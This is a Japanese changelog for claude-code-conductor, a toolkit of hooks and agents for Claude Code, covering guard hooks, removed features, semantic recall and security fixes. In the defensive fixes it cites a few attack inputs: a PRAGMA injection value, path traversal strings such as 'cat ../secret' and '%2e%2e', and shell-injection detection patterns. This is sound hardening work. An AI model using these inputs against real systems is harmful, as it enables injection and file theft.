# Changelog

## [2.14.0] - 2026-05-21

### ルール違反防止策の機械的強制（R5/R6 hook）

2026-05-21 のフルワークフロー動作確認で露呈した 2 件のルール違反に対する構造的対策。
LLM の暴走に対する防御層を強化した（D-012 実装履歴に追記）。

#### 新規 hook（配布対象）

- **`.claude/hooks/check_agent_invocation.py`** 新規（**R5**: PreToolUse Agent）
  - `subagent_type=code-reviewer/security-reviewer` AND `isolation="worktree"` の組み合わせを **exit 2 でブロック**
  - worktree 自動クリーンアップによる `.claude/reports/*.md`（gitignored）消失を防ぐ
  - `tool_input` キー欠落時は exit 0 にフォールバック（fail-safe）。`C3_HOOK_DEBUG=1` で payload をログ出力可能
- **`.claude/hooks/planner_check.py`** 新規（**R2/R4/R6**: PostToolUse Write/Edit）
  - `.dev/_planner_check.py` から汎用ルール R2（reviewer タイムスタンプ禁止）/ R4（writes 衝突）を移植して配布対象化
  - **R6 新規**: plan-report のタスク総数 >= 3 かつ reviewer 系タスク 0 件で **WARN**（レビュー全削除検出。閾値で小規模単発タスクは除外）

#### 既存 hook の整理

- **`.dev/hooks/_planner_check.py`**: C3 固有の R3（`src/c3/_template/` 書き込み禁止）のみに減量。R2/R4 は配布 hook へ移動

#### 教育層の更新

- **`rules/plan-design-guidelines.md`**: R5/R6 を明文化し、検査リストに追加
- **`agents/planner.md`**: Workflow / Tools & Constraints で R5/R6 の hook 経由検出を明記
- **`skills/parallel-agents/SKILL.md`**: 既存の R5 教育文に「hook で機械強制される」注記追加
- **`docs/decisions.md`**: D-012 実装履歴に v2.14.0 hook 追加を追記

#### テスト

- **`tests/hooks/test_check_agent_invocation.py`** 新規（R5 BLOCK/PASS/fail-safe 15 件）
- **`tests/hooks/test_planner_check.py`**: 配布 hook 対象に切り替え + R6 テスト 4 件追加
- **`tests/hooks/test_planner_check_dev.py`** 新規（dev-only R3 テスト 6 件、既存テスト分離）

#### Migration（既存利用先環境向け）

`c3 update` で `.claude/settings.json` の hook 登録が追加されない場合、手動で以下を追加してください:

**PreToolUse の Agent matcher（R5）:**
```json
{
  "matcher": "Agent",
  "hooks": [
    {
      "type": "command",
      "command": "python",
      "args": ["${CLAUDE_PROJECT_DIR}/.claude/hooks/check_agent_invocation.py"]
    }
  ]
}
```

**PostToolUse の Write/Edit に planner_check 追加（R2/R4/R6）:**
既存の post_tool.py に並べる形で planner_check.py を追加してください。

詳細は `.claude/settings.json` の更新後の構造を参照。

---

## [2.13.0] - 2026-05-21

### Agent 軽量化: 「ペルソナ」と「手順・テンプレート」の分離（D-012）

v2.12.0 の「ファイル配置境界」整理に続き、**ファイル内容構造**を整理した。
肥大化していた 2 つの agent 定義から「処理手順」「マークダウンテンプレート」を外出ししてペルソナ定義のみを残した。

> **検証結果による方針修正**: 当初は `dev-workflow/SKILL.md` (642 行) を `phase-a〜phase-e/phase-debug` の 6 skill に分割する案も実装したが、フルワークフロー実走でレビューサイクル中の各 phase skill 重複読み込みによりモノリシック版よりコンテキストコストが高くなることを確認したため revert した。**単一 SKILL.md 維持の方がコンテキスト効率が良い**ことを D-012 に実測根拠として追記。

#### Agent 軽量化

- **`agents/planner.md`** (172 行 → 66 行): 並列実行設計指針・自動検査ルール R2-R4 を `.claude/rules/plan-design-guidelines.md` に外出し。Workflow Before で明示 Read することで二重防御
- **`agents/project-setup.md`** (126 行 → 77 行): Markdown テンプレートと言語→拡張子マッピングを `skills/setup/templates/` と `skills/setup/reference.md` に外出し

phase-a / phase-b / phase-c / phase-d / phase-e / phase-debug の 6 skill 分割を試行し、フルワークフロー実走で検証した結果、レビューループ中の重複読み込みでコンテキスト消費がモノリシック版より悪化することを確認したため revert した。`dev-workflow/SKILL.md` は v2.12.0 同様 642 行の単一ファイルに戻している。

#### 新規ファイル

- **`rules/plan-design-guidelines.md`** 新規（depends_on 設計指針・TDD 3-wave 分解・writes 衝突回避・自動検査 R2/R3/R4・出力直前の自己チェックリスト）
- **`skills/setup/templates/coding-standards-template.md`** 新規（`{LANG_PATHS}` 等のプレースホルダを持つ雛形）
- **`skills/setup/templates/project-conventions-template.md`** 新規
- **`skills/setup/reference.md`** 新規（言語→拡張子 glob マッピング・公式スタイルガイド参照先）

#### Skill 更新

- **`skills/setup/SKILL.md`**: Step 3 のプロンプトを `templates/` と `reference.md` への参照を含む形に書き換え

#### ドキュメント

- **`docs/decisions.md`**: **D-012 追加**（Agent 本体の「ペルソナ」と「手順」分離ルール。フェーズ分割は revert した実測根拠も併記）
- **`docs/taxonomy.md`**: 「Agent 定義の書き方」セクション追加、skill サブディレクトリ規約（`templates/` / `reference.md` / `scripts/` / `examples/`）の用途分担を明文化

#### テスト

- **`tests/skills/test_planner_lightweight.py`** 新規（planner.md 80 行制限 + 外出し済みセクション不在確認 + plan-design-guidelines.md 参照確認）
- **`tests/skills/test_setup_templates.py`** 新規（templates/ と reference.md の存在・プレースホルダ検証）

#### Migration（既存利用先環境向け）

`c3 update` は配布物の **追加** には対応するが、ローカル改変済みファイルは手動マージが必要。
カスタムで `.claude/agents/planner.md` / `.claude/agents/project-setup.md` を改変している場合は事前にバックアップしてください。

1. `pip install -U claude-code-conductor`
2. `c3 update --dry-run` で diff を確認
3. ローカル改変がなければ `c3 update`
4. ローカル改変があれば手動マージ

ローカル改変が無い場合、既存ファイル（`agents/planner.md` / `agents/project-setup.md` / `skills/setup/SKILL.md`）が自動更新され、`rules/plan-design-guidelines.md` / `skills/setup/templates/` / `skills/setup/reference.md` が新規追加されます。

---

## [2.12.0] - 2026-05-21

### タクソノミー棚卸（hooks/ 整理）

- **skill-callable CLI ヘルパーの再配置**: `review_hint_inject.py` / `record_review_decision.py` / `record_tier_outcome.py` を `.claude/hooks/` から `.claude/skills/dev-workflow/scripts/` に移動。`hooks/` は Claude Code のイベントフックとそのヘルパーモジュール専用とする
- **`subagent_log.py` を削除**: PO（Parallel Orchestra、v2.0.0 廃止）時代の残骸。SubagentStart/Stop イベントの開発用ロギングフック
- **`taxonomy.md` / `decisions.md` 更新**: skills の「オーケストレーション skill」「ユーティリティ skill」2 種類分類を追記、D-010 / D-011 を追加（フック拡張・promoted スキルパス変更）
- **`record_review_decision.py` に文字数 / バイト数上限を導入**: `MAX_FINDING_LEN=2000` / `MAX_REASON_LEN=2000` / `MAX_FIELD_BYTES=8192` で DB 肥大化を防止
- **`review_hint_inject.py` に `ALLOWED_REPORT_DIR` パスガード**: `.claude/reports/` 配下のみ許可（パストラバーサル防御）

#### Migration（既存利用先環境向け cleanup 手順）

`c3 update` は配布物の削除を検出しないため、`pip install -U claude-code-conductor` 後に以下を手動実行してください。

**1. 旧 hooks/ 配下の skill-callable スクリプトを削除**

POSIX（Linux/macOS）:
```bash
rm -f .claude/hooks/review_hint_inject.py
rm -f .claude/hooks/record_review_decision.py
rm -f .claude/hooks/record_tier_outcome.py
rm -f .claude/hooks/subagent_log.py
```

PowerShell（Windows）:
```powershell
Remove-Item -Force .claude\hooks\review_hint_inject.py
Remove-Item -Force .claude\hooks\record_review_decision.py
Remove-Item -Force .claude\hooks\record_tier_outcome.py
Remove-Item -Force .claude\hooks\subagent_log.py
```

**2. `.claude/settings.local.json` から `subagent_log.py` 関連を削除**（個人ファイル）

- `permissions.allow` の `"Bash(python .claude/hooks/subagent_log.py*)"` エントリ
- `hooks.SubagentStart` ブロック全体（subagent_log.py を呼ぶもの）
- `hooks.SubagentStop` ブロック全体（同上）

**3. `.claude/settings.json` の `permissions.allow` を新パスに置換**

```diff
- "Bash(python .claude/hooks/review_hint_inject.py*)",
- "Bash(python .claude/hooks/record_review_decision.py*)",
- "Bash(python .claude/hooks/record_tier_outcome.py*)",
+ "Bash(python .claude/skills/dev-workflow/scripts/review_hint_inject.py*)",
+ "Bash(python .claude/skills/dev-workflow/scripts/record_review_decision.py*)",
+ "Bash(python .claude/skills/dev-workflow/scripts/record_tier_outcome.py*)",
```

**4. 確認**

```bash
# 旧パス参照が残っていないか確認
grep -r "\.claude/hooks/review_hint_inject\|\.claude/hooks/record_review_decision\|\.claude/hooks/record_tier_outcome\|\.claude/hooks/subagent_log" .claude/ || echo "OK: 旧パス参照なし"
```

---

## [2.11.0] - 2026-05-21

### 破壊的変更: summarize-memory 機能の廃止

`.claude/memory/llm_summary.md` を生成・自動注入していた `summarize-memory` エージェント機能を完全に廃止した。LLM 出力に narration テキストや tool-call XML マークアップが混入する汚染が数日おきに再発しており（Issue #2 として追跡）、SKILL.md のプロンプト制約・サニタイザでは構造的に修復困難と判断した。`patterns.json` ベースの promotion 候補と MVP セッション集約（`consolidated_summary.md`）は維持。長期記憶の代替として `c3 recall`（v2.10.0 で追加）の意味検索を利用すること。

### 削除

- **`summarize-memory` エージェント / スキル**
  - `.claude/agents/summarize-memory.md`
  - `.claude/skills/summarize-memory/SKILL.md`
- **Stop hook Phase 3**（LLM 要約エージェント起動フラグ制御）
  - `.claude/hooks/session_stop.py` の `_FLAG_PATH` / `_FLAG_DONE_CONTENT` / `_AGENT_INSTRUCTION` 定数
  - `_needs_summary()` / `_create_flag()` / `_handle_flag_phase()` / `_sanitize_llm_summary()` 関数
- **`consolidate_memory.py` の LLM 関連 API**
  - 関数: `build_llm_summary_section()` / `_spawn_detached_llm()` / `_llm_only_main()` / `_ensure_llm_summary_placeholder()` / `_write_llm_summary_extract()` / `_acquire_llm_lock()` / `_release_llm_lock()` / `_escape_for_xml()` / `_build_llm_prompt()` / `_parse_today_arg()`
  - 定数: `_LLM_INPUT_MAX_CHARS` / `_LLM_OUTPUT_MAX_CHARS` / `_LLM_TIMEOUT_SEC` / `_LLM_DEPTH_ENV` / `LLM_SUMMARY_FILE_NAME` / `LLM_SUMMARY_PATH` / `LLM_SUMMARY_PLACEHOLDER` / `LOCK_PATH` / `LOCK_STALE_SEC` / `LLM_ONLY_FLAG`
  - `write_summary()` の `enable_llm` パラメータ（破壊的シグネチャ変更）
  - `consolidate_memory.py --llm-only <iso>` モード
- **配布除外パターン**: `memory/llm_summary.md` を `.gitignore` / `src/c3/_excludes.py` / `hatch_build.py` から削除（生成自体しなくなったため）

### 変更

- **`.claude/CLAUDE.md`**: `@memory/llm_summary.md` の自動注入参照を削除
- **テストの整理**: `tests/hooks/test_consolidate_memory.py` から LLM 関連 13 クラス約 43 件、`tests/hooks/test_session_stop.py` から Phase 3 関連 3 クラス計 14 件を削除（871 件 → 814 件）

### Migration（既存利用先環境向け cleanup 手順）

`c3 update` は配布物の削除を検出しないため、`pip install -U claude-code-conductor` 後に以下を手動実行してください。

```bash
# 1. CLAUDE.md の自動注入参照を削除
#    .claude/CLAUDE.md の `@memory/llm_summary.md` 行を手動編集で削除

# 2. ランタイム生成物を削除（gitignored）
rm -f .claude/memory/llm_summary.md
rm -f .claude/state/llm_summary_agent_requested.flag
rm -f .claude/state/consolidate_llm.lock

# 3. 不要になったエージェント / スキルを削除
rm -f .claude/agents/summarize-memory.md
rm -rf .claude/skills/summarize-memory/
```

### 根拠

- 数日おきに発生する LLM 出力の汚染（narration テキストや内部 tool-call XML マークアップが Write content に混入）が SKILL.md のプロンプト制約 / サニタイザでは構造的に修復困難
- `@memory/llm_summary.md` 経由で汚染が次セッションへ自己増殖する設計上の脆さ
- 効果が限定的：要約に「再発パターン」と記録されているにも関わらず同じ問題が繰り返し再発し、LLM の行動変容に繋がっていない
- 約 1900 行のプロダクションコード + 約 2500 行のテストという過大な投資に対する費用対効果の悪化
- 代替手段：`c3 recall` の HNSW + 多言語 embedding によるオンデマンド意味検索（v2.10.0 で導入済み）でセッション履歴を必要時に取得可能

---

## [2.10.0] - 2026-05-19

### 概要

業務環境で蓄積される `.claude/memory/sessions/` / `.claude/agent-memory/` / `.claude/reports/archive/` / `.claude/memory/patterns.json` を意味検索（HNSW + 多言語 embedding）で再利用できる `c3 recall` 機能を追加。fastembed + `sentence-transformers/paraphrase-multilingual-MiniLM-L12-v2`（384 dim, ~220MB, Apache-2.0, ~50 言語対応）で日本語・英語・コードを横断検索する CLI と、LLM 自律呼び出し用の `/recall` Skill を同梱。設計書 `.claude/docs/C3_hnsw_機能追加詳細設計.md` 準拠（fastembed 公式 onnx に上がっていない `intfloat/multilingual-e5-small` ではなく MiniLM-L12-v2 を採用、E5 プレフィックス自動付与は E5 系モデル選択時のみに切替）。

### 追加

- **`c3 recall` CLI サブコマンド** (`src/c3/cli_recall.py`)
  - `c3 recall search "<query>"` — 意味検索を実行。`--top` / `--source` / `--min-score` / `--json` をサポート（既定 top=5, min-score=0.3）
  - `c3 recall "<query>"` — 省略形。`c3 recall search "<query>"` と同義（`src/c3/cli.py` の `_rewrite_recall_shortcut`）
  - `c3 recall rebuild [--force] [--source SOURCE]` — インデックスを `.claude/state/recall.hnsw` に再構築（atomic write + `.bak` 保持）
  - `c3 recall stats [--json]` — チャンク数・ソース別内訳・モデル名・最終 rebuild 日時を表示（fastembed ロード不要）
- **`src/c3/recall_chunker.py`** — Markdown `##` 見出し単位 → 1000 文字超は 100 文字重複窓で再分割（E5 の 512 token 上限と整合）
- **`src/c3/embedding.py`** — `Embedder` ABC + `FastEmbedBackend`。デフォルトは MiniLM-L12-v2（プレフィックス不要）。`intfloat/multilingual-e5-{small,base,large}` を指定した場合のみ `query: ` / `passage: ` プレフィックスを自動付与
- **`src/c3/recall_index.py`** — HNSW (`cosine` / M=16 / ef_construction=200 / ef_query=50) + `recall_meta.json` のラッパー。`.claude/memory/sessions/*.tmp` / `.claude/agent-memory/**/*.md` / `.claude/reports/archive/*.md` / `.claude/memory/patterns.json` の収集ロジックも提供
- **`/recall` Skill** (`.claude/skills/recall/SKILL.md`) — LLM 自律呼び出し用。設計書 §7 準拠の `name:` / `description:` / `allowed-tools:` フロントマター形式
- **UserPromptSubmit hook** (`.claude/hooks/recall_inject.py`) — ユーザーのプロンプトを受けて自動で `c3 recall search` を実行し、上位 3 件を `additionalContext` として親 Claude に注入する。**「現タスクと無関係なら無視してください」と前置きして AI に判断を委譲する設計（α 案）**。短い prompt / スラッシュコマンド / @mention / index 未構築時は silent no-op。`C3_RECALL_HOOK_DISABLE=1` で停止可
- **ステール検出 → AskUserQuestion 連携** (`.claude/hooks/recall_inject.py::index_is_stale`) — hook がソース mtime と index mtime を比較してインデックスが古い場合、`additionalContext` の冒頭に「AskUserQuestion で `今すぐ rebuild する / 後で / 無視` の 3 択をユーザーに提示してください」というディレクティブを追加。親 Claude が読み取って AskUserQuestion を発火し、ユーザーが「今すぐ rebuild」を選んだ場合は Bash で `c3 recall rebuild` を実行する流れ。同一セッション中に「後で」「無視」を選んだら再尋問しない方針を SKILL.md に明記
- **`LICENSES/` ディレクトリ** — Apache-2.0 / MIT の出典明示用に新設。chroma-hnswlib / fastembed / onnxruntime / sentence-transformers/paraphrase-multilingual-MiniLM-L12-v2 の 4 セット同梱

### 変更

- **必須依存追加** (`pyproject.toml`): `chroma-hnswlib>=0.7.6` / `fastembed>=0.8.0`。fastembed は torch 非依存で +220MB 程度（onnxruntime + 多言語 MiniLM モデル）
- **wheel `force-include`** (`pyproject.toml`): `LICENSES/` ディレクトリを `c3/LICENSES` として同梱
- **`.gitignore` / `_excludes.py` / `hatch_build.py`** — `.claude/state/*` 既存除外で `recall.hnsw` / `recall_meta.json` は自動的に Git 管理外。`fastembed_cache/` / `.fastembed_cache/` の fail-safe 除外を `.gitignore` に追加

### 配布の取り扱い

- HNSW インデックス本体 (`recall.hnsw`) / メタデータ (`recall_meta.json`) は `.claude/state/*` で除外、各環境で `c3 recall rebuild` により再生成
- fastembed のモデルファイル (~150MB) は `~/.cache/fastembed/` にキャッシュ（環境変数 `FASTEMBED_CACHE_PATH` で変更可）。Git 管理対象外
- 業務利用先で `c3 update` 経由で受け取れる（破壊的変更なし）

### 既知事項

- 初回 `c3 recall rebuild` 時に fastembed がモデルをダウンロードする（~220MB、オフライン環境では `FASTEMBED_CACHE_PATH` を社内 NAS 等に向ける運用が必要）
- インデックスのステール検出は mtime ベース。`c3 recall search` 時に古い場合は stderr で警告するが、検索自体は続行する
- 検索しきい値: `--min-score` の既定は `0.3`（E2E 検証で実用的と判断）。0.5+ にすると強い類似のみ、0.0 で無効化
- fastembed の mean pooling 警告（情報メッセージ）は `embedding.py` 側で抑制済み。挙動は sentence-transformers 公式と整合しており、結果に問題なし

### セキュリティ告知（SR-H-1: 推移的依存 urllib3）

`urllib3 <= 2.6.3` に既知脆弱性が報告されています。C3 の直接依存ではありませんが、`fastembed → huggingface-hub → urllib3` 経由で間接的に利用されます。利用環境で `pip install -U urllib3` を実行し、2.7.0 以上にアップデートすることを推奨します。

---

## [2.9.0] - 2026-05-19

### 概要

リポジトリ全体（src/c3 + .claude/hooks + .claude/skills + .claude/agents + tests）に対して code-reviewer と security-reviewer を並列実行し、全重大度（Critical / High / Medium / Low）の指摘ゼロまで修正サイクルを回す全体監査リリース。バッチ A（コア実装 25 ファイル）/ バッチ B（Hooks + Skills + Agents 47 ファイル）/ バッチ C（テストコード 約50 ファイル）の三段構成で実施し、合計 30 件超のレビュー指摘を解消。同時に過去から放置されていたテスト 22 件失敗を全件解消し、全 746 テスト + 3 skipped で PASS 確定。

### 追加

- **`db.py` に `_apply_busy_timeout()` ヘルパー** (`src/c3/db.py`): PRAGMA busy_timeout の `int()` 防衛キャストを全 7 経路で集約 [SR-INJ-001]。将来 env 経由で値が読まれた場合の PRAGMA インジェクション (`5000; ATTACH ...`) を未然に防ぐ
- **`mcp_server.py` に stdin サイズ上限 `_MAX_LINE_BYTES = 2MB`** (`src/c3/mcp_server.py`): `run()` / `_elicit()` 両経路で適用。巨大ペイロードによる DoS 回避 [SR-V-001]
- **`record_tier_outcome.py` に prompt-history ローテーション** (`.claude/hooks/record_tier_outcome.py` `_rotate_prompt_history_if_needed`): 10MB 上限・2000 行 truncate・`os.replace` アトミック置換 [SR-V-001]。`.claude/logs/prompt-history.jsonl` 無制限成長を防止
- **`restore_session.py` に `extract_section` 後方互換ラッパー** (`.claude/hooks/restore_session.py`): モジュールレベル公開して `session_utils.extract_section` に委譲。テストの module 直接呼び出しに対応
- **`statusline.py` に `build_gauge` 純粋関数** (`.claude/hooks/statusline.py`): 将来オプション利用を見越した bar 描画関数を追加（render_output は現状の省スペース UI を維持）→ **後段で削除（後述 #変更）**

### 変更

- **`/start` ドキュメントを 4 択直接選択方式に更新** (`docs/skills.md`): v2.8.0 で実施した task-routing 削除と task_type 撤去の波及で「タスク種別と推奨エージェント編成」セクションを実フローに合わせて書き換え。`task-routing` スキルへの参照を全削除
- **`statusline.py` の UI を「省スペース・高情報密度」に統一** (`.claude/hooks/statusline.py`): 過去の意図的な省略リファクタを維持 (`ctx used X%` / `5h lim X%` / `7d lim X%`)。ヘッダーから `context_window_size` (200K/1M) 表示を削除し `ctx used` との情報重複を解消
- **`select_tier.py` の `_mask_secrets` PEM 終端処理を修正** (`.claude/hooks/select_tier.py`): `m.group(1) + "***"` のみで `-----END PRIVATE KEY-----` が本文に残存していた問題を `m.lastindex` 条件付き `group(2)` 連結で修正
- **`select_tier.py` の死文字コメントを整理** (`.claude/hooks/select_tier.py`): PO 廃止（v2.0.0）後も残っていた「PO 経由のサブエージェント起動時はこの推奨が claude --agents JSON で自動適用」「runner.py がこれを読んで」等の表現を実態に合わせて簡素化
- **`dev-workflow/SKILL.md` D-2.5 を `[SR-AI-001]` に統合** (`.claude/skills/dev-workflow/SKILL.md`): D-0 bug-fix モードと同様の「debug-analysis はファイルパスのみプロンプトに含め内容は agent 側 Read」設計に統一。エラーメッセージ経由のプロンプトインジェクションリスクを解消
- **`parallel-agents/SKILL.md` に `PO_WORKTREE_GUARD=1` 設定明示** (`.claude/skills/parallel-agents/SKILL.md`): wt_* agent 起動プロンプト先頭で env 設定を必須化。worktree_guard.py が env 未設定時に自己無効化する仕様への運用ガード [SR-V-002]

### 修正

- **`stop.py::update_patterns` の None クラッシュガード** (`.claude/hooks/stop.py`): `_parse_session_date(registered_date_str)` が None を返した際に `(today - registered).days` で `TypeError` が発生していた問題を、None 時は `active.append(pattern)` で保持して継続するガードで修正
- **`subagent_log.py` の `_U2028` / `_U2029` 可読性向上** (`.claude/hooks/subagent_log.py`): 値は元から正しい Unicode 文字（U+2028 / U+2029）だがエディタ表示でスペースと区別不能だったため、コメントで `LINE SEPARATOR` / `PARAGRAPH SEPARATOR` を明記
- **`cli_plan.py` exit code 定数化** (`src/c3/cli_plan.py`): `return 2` のマジックナンバーを `_EXIT_MANIFEST_ERROR = 2` 定数として宣言、由来コメント付与
- **`question.py::_clear_screen` の TTY ガード追加** (`src/c3/question.py`): パイプ・リダイレクト時に ANSI 制御シーケンスが出力される副作用を `sys.stdout.isatty()` チェックで防止
- **`_terminal.py` / `cli_tier.py` の docstring 修正** (`src/c3/_terminal.py` / `src/c3/cli_tier.py`): PO 廃止時に削除された `cli_status.py` への参照を正しいファイル名・歴史的注記に更新
- **`plan_validator.py` の `po_plan_version` フィールド維持理由明文化** (`src/c3/plan_validator.py`): 「PO 廃止後も後方互換のため維持」のコメントを docstring に追記。次回 major bump での改名を予約
- **`.claude/settings.json` の `${CLAUDE_PROJECT_DIR}` 表記統一** (`.claude/settings.json`): `statusLine.command` の `$CLAUDE_PROJECT_DIR`（ブレースなし）を hooks セクションと同じ `${CLAUDE_PROJECT_DIR}` 形式に統一

### テスト

- **`statusline.py` テスト 22 件失敗を全件解消** (`tests/test_statusline.py` / `tests/hooks/test_statusline.py`): 削除済みの `build_gauge` / `BLOCK` / `BLOCK_EMPTY` 等を参照していた旧 Red-phase テストを実装に合わせて更新・削除
- **`restore_session.py` テスト 7 件失敗を全件解消** (`tests/hooks/test_restore_session.py`): subprocess 経由で `session_utils.py` も tmp_path 配下にコピーする方式に修正。`extract_section` 動的呼び出しに対応
- **`worktree_guard.py` テスト 3 件失敗を全件解消** (`tests/test_worktree_guard.py`): subprocess 起動時に `PO_WORKTREE_GUARD=1` env + Windows 必須の `SYSTEMROOT` / `PATH` を渡す `_run_guard()` ヘルパーに改修
- **全テスト Red-phase docstring を Green 回帰防止表現に統一**: `tests/test_pre_compact.py` / `tests/test_pre_tool_hook.py` / `tests/test_session_utils_additional.py` / `tests/test_stop_hook.py` / `tests/test_stop_additional.py` / `tests/test_template_pre_tool_hook.py` / `tests/hooks/test_consolidate_memory.py` / `tests/hooks/test_session_utils.py` の「This test FAILS on the unfixed implementation」等の旧 TDD Red docstring を「実装側修正済み、退行防止のための Green 回帰防止テスト」表現に置換

### 内部

- **全体レビュー 3 バッチ x 各 2〜4 サイクル実施**: バッチ A 2 サイクル / バッチ B 2 サイクル / バッチ C 4 サイクル。各レポートは `.claude/reports/archive/{code,security}-review-report-*.md` に記録
- **`code-reviewer` MEMORY 更新** (`.claude/agent-memory/code-reviewer/MEMORY.md`): 「`pyproject.toml` の `duckdb>=0.10` は SQLite+DuckDB ハイブリッド構成の意識的な設計判断で `[CR-Q-005]` / `[CR-R-001]` で再指摘しない」許容例外を追記。本セッションで発生した未使用判定ミスの再発防止
- **テスト 5 件削除**（`build_gauge` / `BLOCK` 関連、削除済み機能のテストだったため）
- **3 ファイル同期ルール反映**: `.gitignore` / `src/c3/_excludes.py` / `hatch_build.py` の `EXCLUDE_PATTERNS` 同期維持

---

## [2.8.0] - 2026-05-18

### 概要

permission_handler を同期ブロッキング方式に変更してトーストで承認を完結させ、`permission_rules.json` で settings.json と同形式の相対パスパターンを使えるようにした。あわせて hook を exec 形式 (args 配列) に移行し、`summarize-memory` を D-008 フォーマット + skills プリロード構成へ刷新。トラバーサル防御を `..` / `%2e%2e` / 混在区切り / Windows パス全方位で強化し、`on_activated` のタイムアウト連続消費バグを修正した。さらに `task-routing` スキルと `task_type` 概念を撤去して `/start` フローを簡素化。全 18 サイクルのコードレビュー・セキュリティレビューを経て品質を確定。

### 追加

- **`permission_handler` にブロッキング型トースト承認を実装** (`.claude/hooks/permission_handler_toast.py`): `subprocess.run(timeout=70)` で同期実行に変更し、トーストのボタンクリック (`decision:allow`) で PermissionRequest を完結させる。fire-and-forget detached subprocess を廃止
- **`permission_rules.json` に相対パスパターン対応を追加** (`.claude/hooks/permission_handler.py` `_match_file_path()`): 二段階照合 (絶対パス → プロジェクトルート起点相対パス) で `.claude/**` 形式のパターンが利用可能に。`settings.json` の `permissions.allow` と同じ書式に統一
- **`_accepted_exceptions` ドキュメントフィールド** (`.claude/permission_rules.json`): auto_allow に全許可パターンを登録した理由を JSON 内に記録する仕組みを追加。`_readme` を含むアンダースコア始まりキーはドキュメント専用として `permission_handler.py` から無視される
- **`auto_allow` サイズ上限** (`.claude/hooks/permission_handler_toast.py` `_AUTO_ALLOW_MAX_SIZE`): 上限 100 件でパターン爆発を抑制

### 変更

- **Hook 定義を exec 形式 (args 配列) に移行** (`.claude/settings.json`): `command` 文字列方式から `{"command": "python", "args": ["${CLAUDE_PROJECT_DIR}/.claude/hooks/foo.py"]}` 形式へ移行。`${CLAUDE_PROJECT_DIR}` プレースホルダで CWD 依存を排除しシェル非経由で実行
- **`summarize-memory` を D-008 フォーマット + skills プリロード構成に刷新** (`.claude/agents/summarize-memory.md` + `.claude/skills/summarize-memory/SKILL.md`): エージェント定義は Core Mandate / Key Scope / Workflow / Tools & Constraints の D-008 規約に準拠。詳細実行手順は `skills:` frontmatter でプリロードされるバックグラウンド知識として SKILL.md に分離
- **Stop hook orchestrator 化** (`.claude/hooks/session_stop.py`): stdin 読み出し 1 回で `stop` → `consolidate_memory` → flag 制御を順次実行する Phase 構造に整理。`_FLAG_DONE_CONTENT = "DONE"` で状態機械 (空 = 実行中 / DONE = 完了) を明確化

### 修正

- **トラバーサル防御を全方位で強化** (`.claude/hooks/permission_handler.py`):
  - `..` 完全一致検出 (`"..hidden"` 等は通過): `path.replace('\\', '/').split('/')` でセグメント単位に比較
  - URL エンコード変種 (`%2e%2e`): `urllib.parse.unquote()` で展開してから検出。`_match_file_path()` と `suggest_pattern()` 両経路で一貫適用
  - 混在区切り (Windows バックスラッシュ + UNIX スラッシュ): `replace(os.sep, '/')` → `replace('\\', '/')` に変更しプラットフォーム非依存に
  - Bash 先頭 1〜2 トークンの `..` ガード: `_SHELL_INJECTION_RE` が `..` を対象外のため明示チェック追加 (`../evil` や `cat ../secret` を提案から除外)
  - `_match_file_path()` の `subject_rel_decoded` 切り出し: `..` チェックは decoded、regex マッチはエンコード済みで実施し意図を分離
- **`on_activated` 未知引数時のタイムアウト連続消費バグを修正** (`.claude/hooks/permission_handler_toast.py`): `done.set()` を `if/elif/else` 外に固定し、未知引数でも `_TIMEOUT_SEC(60s)` + `subprocess.run timeout(70s)` の連続消費 (合計 130 秒の擬似フリーズ) を防止
- **toast subprocess の stderr 転送** (`.claude/hooks/permission_handler.py` `notify_with_action`): `result.stderr` を `sys.stderr.buffer.write` で親プロセス stderr に伝搬し診断ログ消失を防止 [SR-R-004]
- **`_TOAST_UNAVAILABLE_EXIT_CODE` を 3 に変更** (`.claude/hooks/permission_handler_toast.py`): Stop hook の `exit 2` (エージェント起動指示) との文脈衝突を回避
- **html.escape() を全 toast テキストフィールドに適用** [SR-INJ-002]: `<` / `&` を含むパスでも windows-toasts の XML テンプレートパースエラーを起こさない
- **トラバーサル防御 `_match_file_path()` のスライスバグ** (`.claude/hooks/permission_handler.py`): `lower()` 後に文字数が変わりうる非 ASCII 文字 (`İ` 等) でスライスがずれていた問題を `len(project_root_posix)+1` 固定で修正
- **`session_stop._handle_flag_phase()` の TOCTOU 耐性** (`.claude/hooks/session_stop.py`): `os.unlink()` をアトミック操作とし、`OSError`（他プロセスが先に削除）で重複起動を防止
- **`_SHELL_INJECTION_RE` に `\n` と `$'` を追加** (`.claude/hooks/permission_handler.py`): ヒアドキュメント改行と ANSI-C quoting によるエスケープシーケンス挿入を検出
- **サブエージェント定義の `Skill` ツール契約欠陥を修正** (`.claude/agents/{code-reviewer,security-reviewer,planner,doc-writer,architect,interviewer}.md`): Workflow After で `report-timestamp` スキルを呼び出す契約だったが frontmatter の `tools:` に `Skill` が含まれておらず、Bash で代替実行されていた。tools に `Skill` を追加して契約を整合

### 削除

- **`task-routing` スキル削除** (`refactor(skills): task-routing 削除 + task_type 概念撤去 + /start フロー簡素化` / commit 96cccc3): `/start` フローを「標準ワークフロー / 実装 / デバッグ / レビュー」の 4 択直接選択方式に簡素化したため、推奨エージェント編成を提示する task-routing スキルが不要化
- **`task_type` / `TASK_TYPE` 概念を撤去**: 全 SKILL.md（`start`、`dev-workflow` ほか）から「タスク種別を選んで分岐する」ロジックを削除。既存セッションファイルに残る `TASK_TYPE:` 行は無視されるため後方互換あり
- **`start/SKILL.md` Step 0.5（タスク種別確認）削除**: タスク種別の中間選択を省き、開始地点（フェーズ）を直接選ぶフローに統一

### テスト

- **トラバーサル防御テスト 12 件追加** (`tests/hooks/test_permission_handler.py`):
  - Bash 先頭 / 第 2 トークンの `..` 検出 (2 件)
  - Write / Edit / Read の `..` 検出 (4 件)
  - 境界ケース: `".."` 単体 / `"..hidden"` 通過 / 混在区切り / URL エンコード (4 件)
  - `matches_pattern()` 側の URL エンコードトラバーサル (POSIX / Windows パス) (2 件)
- **`test_settings_local_absolute_paths` を exec 形式に対応** (`tests/hooks/test_settings_local_absolute_paths.py`): `command` + `args` 両方からスクリプトパスを抽出し、`${CLAUDE_PROJECT_DIR}` プレースホルダも許容する
- **`task-routing` 撤去関連テスト追加** (`tests/skills/test_start_skill_no_task_type.py` ほか): `task_type` を含まない `/start` フローの動作を検証

### 内部

- **`_FLAG_DONE_CONTENT = "DONE"` 定数の SSOT 化** (`.claude/hooks/session_stop.py`): フラグ状態機械の値を `session_stop.py` / `summarize-memory` SKILL.md / テストで共有
